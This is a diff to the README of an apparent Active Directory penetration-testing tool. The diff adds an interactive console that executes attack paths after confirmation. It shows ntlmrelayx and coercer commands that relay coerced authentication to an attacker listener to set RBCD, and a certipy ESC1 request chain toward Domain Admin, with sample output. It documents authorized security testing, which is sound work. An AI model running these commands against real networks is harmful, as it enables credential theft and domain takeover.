@@ -19,15 +19,16 @@ It runs in two modes:
 
 - **Unauthenticated** — given just a target (and optionally a domain), it probes SMB
   signing, NULL sessions, anonymous share/RID enumeration, LDAP anonymous bind, LDAP
-  signing / channel-binding relay exposure, WebDAV/WebClient discovery, and AS-REP
-  roasting (with a userlist).
+  signing / channel-binding relay exposure, WebDAV/WebClient discovery, **timeroasting**
+  (NTP computer-account hashes, no creds required), and AS-REP roasting (with a userlist).
 - **Authenticated** — given a domain, username, and password (or NT hash), it adds
   password-policy review, local-admin detection, Kerberoasting, delegation
   enumeration, active **RBCD enumeration**, **coercion-surface detection**
   (PetitPotam/PrinterBug/DFSCoerce/ShadowCoerce), **noPac** (CVE-2021-42278/42287),
-  MachineAccountQuota, a full AD CS template audit (**ESC1–ESC16**), and
-  **BloodHound-based ACL path analysis** (GenericAll, WriteDacl, ForceChangePassword,
-  AddMember, shadow credentials, RBCD, GPO abuse, DCSync, more).
+  MachineAccountQuota, **GPP cpassword** (SYSVOL), **pre-Windows 2000 computer
+  accounts**, a full AD CS template audit (**ESC1–ESC16**), and **BloodHound-based ACL
+  path analysis** (GenericAll, WriteDacl, ForceChangePassword, AddMember, shadow
+  credentials, RBCD, GPO abuse, DCSync, more).
 
 ### RBCD and WebDAV / cross-protocol relay
 
@@ -50,15 +51,285 @@ signing / channel binding — together these form the classic HTTP-coercion → 
 - **GPO abuse**: control over a GPO (or `WriteGPLink` on an OU/site) becomes a
   code-execution-on-linked-hosts hop toward local/Domain Admin.
 
-## Detection and guidance only
+### NTLMv1, NTLM reflection, and SCCM / PXE NAA
 
-Domainerator **does not exploit anything**. It enumerates, correlates, and reports
-the routes to Domain/Enterprise Admin, printing the exact operator command for each
-step so **you** decide what to run. It never sprays passwords, coerces authentication,
-requests certificates, or performs DCSync on its own.
+- **NTLMv1 acceptance** — flags hosts that still negotiate NTLMv1, whose DES-based
+  responses are crackable to the NT hash (feeds the crack → credentials chain).
+- **NTLM reflection** — detects hosts where coerced authentication can be relayed back
+  to the same host (self-relay), a direct route to local administrator on that host.
+- **SCCM / PXE NAA** — discovers SCCM management points / sites in AD and probes
+  PXE-enabled distribution points for recoverable **Network Access Account** credentials,
+  which are valid domain credentials and a useful foothold.
+
+### Credential-recovery footholds: GPP, pre-2000, timeroasting
+
+- **GPP cpassword** — searches SYSVOL Group Policy Preferences for a `cpassword` value
+  encrypted with the public, Microsoft-published AES key. Any authenticated user who can
+  read SYSVOL can decrypt it to plaintext (often privileged) domain credentials
+  (`low_priv_user` → `valid_credentials`).
+- **Pre-Windows 2000 computer accounts** — flags computer objects whose password matches
+  the predictable pre-2000 default (the lowercased account name), a free authenticated
+  foothold as a machine account (`low_priv_user` → `valid_credentials`).
+- **Timeroasting** — abuses MS-SNTP to recover crackable computer-account hashes over NTP
+  with no domain credentials required (`unauthenticated` → `crackable_hash` → crack →
+  `valid_credentials`).
+
+## Detection and guidance
+
+Domainerator enumerates, correlates, and reports the routes to Domain/Enterprise Admin,
+printing the exact operator command for each step so **you** decide what to run. It never
+sprays passwords, coerces authentication, requests certificates, or performs DCSync on its
+own. The interactive console provides guided execution with confirmation prompts, but all
+exploitation actions require explicit operator approval.
 
 > Intended for authorized security testing only. Run it only against systems you have
 > explicit written permission to assess.
+
+## Interactive Console
+
+After scanning, launch the **Metasploit-style interactive console** to explore discovered
+attack paths and guide through exploitation:
+
+```bash
+domainerator -t 10.0.0.10 -d corp.local -u alice -p 'S3cret!' --console
+```
+
+The console provides:
+
+- **Path browser** — `show paths` lists all discovered escalation paths ranked by reliability
+- **Path selection** — `use <id>` selects a specific attack path to explore
+- **Variable substitution** — `set LHOST 10.0.0.5` fills command placeholders (Metasploit-style)
+- **Step-by-step guidance** — `run` or `exploit` walks through each step with command preview
+- **Real execution** — run commands through the built-in runner (scope-enforced, password-redacted)
+- **Reactive capability tracking** — successful step output auto-grants the resulting capability and recomputes paths
+- **Relay orchestration** — `relay` coordinates a background `ntlmrelayx` listener with a coercion trigger as one action
+- **Multi-target sessions** — `targets`/`target <id>` switch the active host among everything you scanned
+- **Loot capture** — hashes, tickets, and certs are extracted from output into `show loot`
+- **Session persistence** — `save` persists state for iterative foothold→DA workflows
+
+### Console commands
+
+| Command | Description |
+| --- | --- |
+| `help` | Show available commands |
+| `show paths` | Display discovered attack paths (ranked by reliability) |
+| `show findings` | Display all findings from checks (sorted by severity) |
+| `show capabilities` | Show current privilege state |
+| `show targets` | Display target information |
+| `show loot` | Show hashes/tickets/certs captured from executed steps |
+| `use <id>` | Select an attack path by ID |
+| `info` | Show details of selected path and current step |
+| `preview` | Show the current step's fully-substituted command without running |
+| `run` / `exploit` | Execute/guide through current step (with confirmation) |
+| `next` | Advance to next step in path |
+| `back` | Deselect current path, return to main menu |
+| `set <NAME> <value>` | Set a variable that fills command placeholders |
+| `unset <NAME>` | Clear a variable |
+| `options` | Show all variables and the placeholders they fill |
+| `grant <capability>` | Manually mark a capability as obtained (recomputes paths) |
+| `targets` | List all scanned hosts and mark the active one |
+| `target <id>` | Switch the active target to a scanned host |
+| `relay [mode] [method]` | Coordinate a background ntlmrelayx listener with a coercion trigger |
+| `scan [check]` | Run additional checks (all or specific) |
+| `rescan` | Re-run all checks with current capabilities |
+| `save [file]` | Save session state to file |
+| `report [dir]` | Regenerate Markdown + JSON report from the current session state |
+| `status` | Show session status |
+| `exit` / `quit` | Exit console (auto-saves if state file configured) |
+
+### Command variables
+
+Path-step commands are templates with placeholders (attacker IP, userlist, CA name, etc.).
+The console maps these to settable variables. Target-derived values (`DC`, `DC_IP`,
+`DOMAIN`, `USER`, `PASS`) are auto-populated from your scan arguments; the rest you set as
+needed. `options` lists them all:
+
+| Variable | Fills placeholders | Auto-filled from |
+| --- | --- | --- |
+| `LHOST` | `ATTACKER-IP`, `ATTACKER-HOST`, `attacker@port` | — (set manually) |
+| `USERLIST` | `users.txt` | — |
+| `PASSLIST` | `passwords.txt` | — |
+| `DC` | `DC` | target host |
+| `DC_IP` | `DC-IP` | `--dc-ip` |
+| `DOMAIN` | `DOMAIN` | `--domain` |
+| `USER` | `USER` | `--username` |
+| `PASS` | `PASS` | `--password` |
+| `CA` | `CORP-CA`, `CA-NAME`, `CA_NAME` | — |
+| `TEMPLATE` | `TEMPLATE-NAME`, `TEMPLATE_NAME` | — |
+| `SPRAY_PASSWORD` | `Season2025!` | — |
+
+A command is only runnable once its recognised placeholders are filled — the console
+refuses to execute a step with unfilled variables and tells you which are missing.
+
+### Execution and the reactive loop
+
+When you choose `[r]` to run a step, the substituted command is parsed to an argument list
+and executed through the same `ToolRunner` used for scanning, so `--scope` enforcement and
+password redaction still apply. Commands that use shell features (pipes, redirects) or are
+written as multi-command guidance (starting with `#`) are shown for you to run manually
+rather than executed blindly.
+
+After a run, the output is inspected for technique-specific success signals (e.g. a
+`$krb5tgs$` blob for Kerberoast, a saved certificate for ADCS). On a confirmed success the
+console **grants the resulting capability, recomputes the attack paths, and advances to the
+next step** — so `show paths` always reflects your current reality. If the signal isn't
+recognised, the step is reported as unconfirmed and you can record progress yourself with
+`grant <capability>` or the `[m]` option.
+
+### Multi-target sessions
+
+When you scan more than one host (`--targets hosts.txt`, or repeated `--target`), the
+console keeps them all. `targets` lists them and marks the one you're working on; `target
+<id>` makes another host active:
+
+```
+domainerator > targets
+
+ID   Host                         Domain               Auth
+------------------------------------------------------------------
+*0   10.0.0.10                    corp.local           yes
+ 1   10.0.0.20                    corp.local           no
+ 2   10.0.0.30                    corp.local           no
+
+* = active target. Use 'target <id>' to switch.
+
+domainerator > target 1
+Active target is now [1] 10.0.0.20 (corp.local)
+Command variables re-seeded from this target.
+```
+
+Switching re-seeds the target-derived command variables (`DC`, `DC_IP`, `DOMAIN`, `USER`,
+`PASS`) from the newly active host, so subsequent commands point at the host you're working
+on. Variables you set explicitly with `set` are treated as operator-owned and are **never**
+overwritten by a target switch — only auto-derived values follow the active host. The
+attack paths, capabilities, and loot are session-wide, so switching targets changes what
+commands point at without discarding your progress.
+
+### Relay orchestration
+
+NTLM-relay chains need two processes running at once: a listener (`ntlmrelayx.py`) and a
+coercion trigger. Coordinating them by hand means juggling terminals and getting the timing
+right. The `relay` command sequences them as a single action:
+
+1. Starts `ntlmrelayx.py` in the background (scope-enforced, output captured).
+2. Waits until it reports it is serving.
+3. Fires the coercion at the victim host, aimed at your listener.
+4. Watches the relay output for a success signal.
+5. Tears the listener down cleanly, whatever the outcome.
+
+```
+domainerator > set LHOST 10.0.0.5
+domainerator > relay ldap-rbcd coercer
+Select victim host to coerce (or type a host/IP):
+  [0] 10.0.0.10 (active)
+  [1] 10.0.0.20
+  [2] 10.0.0.30
+Victim: 1
+
+============================================================
+Relay orchestration plan
+============================================================
+Mode:      ldap-rbcd - Relay coerced auth to LDAP(S) on the DC and configure RBCD...
+Coercion:  coercer
+Listener:  10.0.0.5
+Relay to:  10.0.0.10
+Victim:    10.0.0.20
+Grants:    rbcd on success
+
+Two coordinated commands will run:
+  1. listener:  ntlmrelayx.py -t ldaps://10.0.0.10 --delegate-access --no-dump ...
+  2. coercion:  coercer coerce -t 10.0.0.20 -l 10.0.0.5 -u alice -p ****** -d corp.local
+
+WARNING: coercion is LOUD and touches the victim host. Ensure it is authorized and in scope.
+
+Proceed? [y/N]: y
+  Starting listener: ntlmrelayx.py -t ldaps://10.0.0.10 ...
+  Servers started, waiting for connections
+  Firing coercion: coercer coerce -t 10.0.0.20 -l 10.0.0.5 ...
+  Watching relay for a success signal...
+  Authenticating against ldaps://10.0.0.10
+  msDS-AllowedToActOnBehalfOfOtherIdentity was set successfully
+  Tearing down listener.
+
+[+] relay success signal detected in listener output
+[+] Granting capability 'rbcd'.
+    Attack paths recomputed.
+```
+
+**Modes** (what the relayed auth does):
+
+| Mode | Action | Grants on success |
+| --- | --- | --- |
+| `ldap-rbcd` | Relay to LDAP(S) on the DC, configure RBCD for a controlled account | `rbcd` |
+| `ldap-shadow` | Relay to LDAP(S), add shadow credentials (msDS-KeyCredentialLink) | `reset_password` |
+| `reflection` | Reflect coerced auth back to the originating host over SMB (self-relay) | `local_admin` |
+
+**Coercion methods**: `coercer` (multi-method sweep), `petitpotam` (MS-EFSR),
+`printerbug` (MS-RPRN), `dfscoerce` (MS-DFSNM).
+
+Values are drawn from session variables: `LHOST` (your listener), `DC_IP`/`DC` (the LDAP
+relay target for the ldap-* modes), and `USER`/`PASS`/`DOMAIN` for the coercion credentials.
+The victim host is chosen from your scanned hosts (pick by number) or typed directly, and
+can be preset with `set RELAY_VICTIM <host>`. Because the LDAP relay target and credentials
+come from the active target's variables, `target <id>` is the quick way to line the relay up
+against a different host. For `reflection` the relay target defaults to the victim itself.
+Passwords are masked in the displayed commands, and the whole action is refused if the
+listener or victim would fall outside `--scope`.
+
+As with everything in Domainerator, **no exploit code ships in the tool** — `relay` only
+coordinates `ntlmrelayx.py` and the coercion tool you already have installed. If either is
+missing from PATH the action reports it and stops.
+
+### Example console session
+
+```
+domainerator > show paths
+
+ID   Goal                 Steps  Reliability   Noise
+------------------------------------------------------------
+ 0   domain_admin         4      High          Moderate
+     ESC1 -> PKINIT-auth -> DCSync -> Domain Admin
+ 1   domain_admin         6      Moderate      Loud
+     RID-cycling -> Password-spray -> Kerberoast -> Hash-crack -> ...
+
+Total: 2 paths
+
+domainerator > set CA CORP-CA
+CA => CORP-CA
+
+domainerator > use 0
+Selected path 0: ESC1 -> PKINIT-auth -> DCSync => domain_admin
+Steps: 4
+
+Step 1/4: ESC1 - Exploitable certificate template
+Technique: ESC1
+Reliability: High
+Noise: Moderate
+
+Command:
+  certipy req -u alice -p S3cret! -dc-ip 10.0.0.10 -ca CORP-CA -template ...
+
+domainerator (path) > run
+...
+Options:
+  [r] Run this command now
+  [c] Copy command to clipboard
+  [s] Skip this step
+  [m] Mark as completed (manually done)
+  [q] Cancel
+
+Choice [r/c/s/m/q]: r
+
+WARNING: This will execute the command shown above.
+Proceed? [y/N]: y
+
+Executing...
+Got certificate with UPN 'alice@corp.local'
+Saved certificate and private key to 'alice.pfx'
+
+[+] Success: granting capability 'cert_as_da'.
+    Attack paths recomputed. Advancing to next step.
+```
 
 ## The main goal: attack paths
 
@@ -92,6 +363,9 @@ Install the tools it drives:
 | `certipy` / `certipy-ad` | AD CS ESC checks | `pipx install certipy-ad` |
 | `GetNPUsers.py` (Impacket) | AS-REP roasting | `sudo apt install impacket-scripts` or `pipx install impacket` |
 | `bloodhound-python` | ACL-based path collection (BloodHound-CE) | `pipx install bloodhound-ce` |
+| `ntlmrelayx.py` (Impacket) | Relay listener for `relay` orchestration | `sudo apt install impacket-scripts` or `pipx install impacket` |
+| `coercer` | Coercion trigger for `relay` orchestration | `pipx install coercer` |
+| `PetitPotam.py` / `printerbug.py` / `dfscoerce.py` | Alternative coercion triggers | project scripts on PATH |
 
 A missing tool never aborts the run — the checks that need it are reported as
 **skipped** with an install hint.
@@ -251,7 +525,9 @@ domainerator -T hosts.txt -d corp.local -u alice -p 'S3cret!' \
 
 `hosts.txt` is one IP/host per line (`#` comments allowed). `--target` and `--targets`
 can be combined. If any target (or `--dc-ip`) is outside `--scope`, the run aborts before
-touching anything.
+touching anything. In `--console` mode, every scanned host is kept in the session so you can
+switch the active target with `target <id>` and pick relay victims from them (see
+[Multi-target sessions](#multi-target-sessions)).
 
 ### Trustworthy results: inconclusive state & tool inventory
 
@@ -260,6 +536,22 @@ signal is absent — is reported as **inconclusive**, not clean. This prevents a
 miss or an unreachable host from being read as "not vulnerable". The report also records
 a **tool inventory** (detected versions of nxc/certipy/impacket/bloodhound-python) so a
 parser miss can be correlated with a tool-version change.
+
+### Live status (press Enter)
+
+While a scan is running in an interactive terminal, press **Enter** at any time to print
+an nmap-style status snapshot: elapsed time, how many *(host, category)* units have
+completed, and which are currently running with their per-unit elapsed time.
+
+```
+Stats: 12s elapsed; 3/9 units done (33%)
+  Running (2):
+    authenticated@10.0.0.10  (8s)
+    unauthenticated@10.0.0.11  (2s)
+```
+
+This is auto-disabled when stdin is not a TTY (pipes, CI), under `--dry-run`, or with
+`--no-status`, so it never interferes with scripted runs or output redirection.
 
 ### Guided workflow: next best action & resume state
 
@@ -293,7 +585,7 @@ domainerator -t 10.0.0.10 -d corp.local -u alice -p 'S3cret!' --state engagement
 | `-H, --hash` | NT hash instead of a password |
 | `-k, --kerberos` | Use Kerberos authentication |
 | `--userlist` | User list file for unauthenticated AS-REP roasting |
-| `--skip-unauth` / `--skip-auth` / `--skip-adcs` | Skip a check category |
+| `--skip-unauth` / `--skip-auth` / `--skip-adcs` / `--skip-sccm` | Skip a check category |
 | `--bloodhound` | Collect BloodHound data with `bloodhound-python` (needs creds) |
 | `--bloodhound-output` | Directory for collection output (default `bloodhound-output`) |
 | `--bloodhound-data` | Ingest existing `.zip` / `.json` / directory of `*.json` |
@@ -301,11 +593,14 @@ domainerator -t 10.0.0.10 -d corp.local -u alice -p 'S3cret!' --state engagement
 | `--max-path-depth` | Max steps in a correlated path (default 8) |
 | `--scope` | Scope file (one IP/CIDR per line); confines all testing |
 | `--workers` | Concurrent workers when scanning multiple targets (default 5) |
+| `--no-status` | Disable the interactive "press Enter for status" feature |
+| `--console` | Launch interactive Metasploit-style console after scanning |
 | `--state` | JSON state file: seeds known capabilities, updated with findings |
 | `--timeout` | Per-command timeout in seconds (default 300) |
 | `--dry-run` | Show commands without executing |
 | `-o, --output` | Write Markdown report to a file |
 | `--json` | Write JSON report to a file |
+| `--output-dir` | Engagement artifacts folder: per-run evidence files (command + raw output) for screenshots, plus reports |
 | `--include-raw` | Include raw tool output in the Markdown report |
 | `--no-color` | Disable colored console output |
 
@@ -323,6 +618,32 @@ Every run prints a colored console summary. With `--output`/`--json` you also ge
 - **Markdown** — findings grouped and sorted by severity, with evidence and
   remediation, plus a per-check execution log.
 - **JSON** — machine-readable, including raw tool output for further processing.
+
+### Evidence capture for reports (`--output-dir`)
+
+When you need screenshots for a customer report, point `--output-dir` at a folder. Each
+run creates a timestamped subfolder with one text file per check — a self-contained header
+(check name, target, exact command, status, timestamp) followed by the raw tool output —
+so a single screenshot carries its own context:
+
+```
+engagement/
+└── run-20260917-214717/
+    ├── evidence/
+    │   ├── 001_unauthenticated_smb-signing-posture.txt
+    │   ├── 002_authenticated_kerberoastable-service-accounts.txt
+    │   ├── 003_authenticated_gpp-cpassword-in-sysvol.txt
+    │   ├── exec_001_kerberoast.txt        # commands run in the console
+    │   └── exec_002_relay-ldap-rbcd.txt   # relay orchestration transcripts
+    ├── report.md
+    └── report.json
+```
+
+Skipped checks are omitted (nothing to screenshot). Commands are password-redacted, the
+same as everywhere else. In `--console` mode, every command you execute (including relay
+orchestration) is captured as an `exec_*.txt` file, and the `report` command regenerates
+`report.md`/`report.json` from the live session state into the same run folder — so after
+interactive work you get a deliverable that reflects everything you actually did.
 
 ## How it works
 
@@ -367,10 +688,18 @@ domainerator/
 │   ├── cli.py              # argument parsing + orchestration
 │   ├── runner.py           # tool execution, scope enforcement, Target model
 │   ├── scan.py             # per-target scan + concurrent multi-target scanning
+│   ├── progress.py         # live status tracker + keypress (Enter) listener
 │   ├── state.py            # resume/state file (cross-run capabilities)
 │   ├── paths.py            # attack-graph model + best-first PathEngine
 │   ├── bloodhound.py       # BloodHound-CE collection/ingestion -> PathSteps
 │   ├── report.py           # JSON / Markdown / console rendering
+│   ├── evidence.py         # per-check / per-execution evidence files (screenshots)
+│   ├── console/            # interactive Metasploit-style console
+│   │   ├── console.py      # REPL loop + command dispatcher
+│   │   ├── session.py      # runtime state + capability tracking
+│   │   ├── variables.py    # command placeholder substitution
+│   │   ├── outcomes.py     # output-driven success detection + loot
+│   │   └── relay.py        # ntlmrelayx + coercion orchestration
 │   └── checks/             # unauthenticated, authenticated, adcs check modules
 ├── tests/fixtures/         # captured tool outputs for parser regression tests
 ├── tests/                  # pytest suite (scope, bloodhound, paths)
